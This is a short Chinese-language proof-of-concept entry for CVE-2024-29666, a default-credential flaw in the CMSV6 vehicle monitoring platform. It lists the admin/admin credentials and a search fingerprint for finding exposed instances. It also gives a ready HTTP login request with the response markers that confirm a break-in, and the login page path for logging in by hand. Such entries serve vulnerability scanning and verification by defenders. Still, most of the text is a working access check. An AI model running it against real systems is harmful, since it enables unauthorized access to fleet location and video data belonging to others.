﻿# CMSV6车辆监控平台系统中 弱密码漏洞

> 更新时间：2024-03-29

> 漏洞编号：CVE-2024-29666

> 漏洞说明：CMSV6平台是基于车辆位置信息服务和实时视频传输服务的创新技术和开放运营理念。为GPS运营商车辆硬件设备制造商、车队管理企业等车辆运营相关企业提供核心基础数据服务。该系统CMSV6 7.31.0.2、7.32.0.3版本中存在弱密码漏洞。用户名：admin 密码：admin

> 漏洞特征：body="/808gps/"

> 验证脚本：HTTP

```
GET /StandardApiAction_login.action?account=admin&password=admin HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：admin

> 上传文件定位：

> 验证文件来源：CMSV6车辆监控平台系统中 弱密码漏洞.poc

```
备注说明：手工使用admin/admin直接登录即可，登录页：http://x.x.x.x/808gps/login.html
```